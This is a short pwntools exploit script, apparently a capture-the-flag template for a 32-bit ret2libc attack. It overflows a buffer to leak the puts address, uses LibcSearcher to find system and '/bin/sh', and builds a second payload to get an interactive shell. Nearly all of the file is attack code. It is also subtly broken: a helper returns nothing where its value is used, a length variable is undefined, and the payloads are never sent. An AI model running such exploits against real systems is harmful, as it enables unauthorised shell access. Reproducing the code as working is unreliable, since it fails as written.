from pwn import *
from LibcSearcher import *


def ru(x): print(io.recvuntil(x))
def rl(): print(io.recvline())
def sla(x, y): print(io.sendlineafter(x, y))
def sl(x): print(io.sendline(x))
def psize(x): return p32(x)
# 1. ret
# 2. io payload


# io = remote('node4.buuoj.cn', 26019)
root = './$1'
io = process(root)
elf = ELF(root)

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
next_func = 0x8


# io & payload
pass
payload = b''.ljust(231, b'*')
payload += b'b'*4
payload += psize(puts_plt)
payload += psize(next_func)
payload += psize(puts_got)
pass


# get system
puts_addr = u32(ru(b'\n')[:-1])
print(puts_addr)
obj = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - obj.dump('puts')  # libc_base_addr
system = libc_base+obj.dump('system')  # calc funcs addr
bins = libc_base+obj.dump('str_bin_sh')


# final io & payload
pass
payload = b''.ljust(width, b'*')
payload += b'b'*4
payload += psize(system)
payload += psize(0x12345)
payload += psize(bins)
pass

io.interactive()
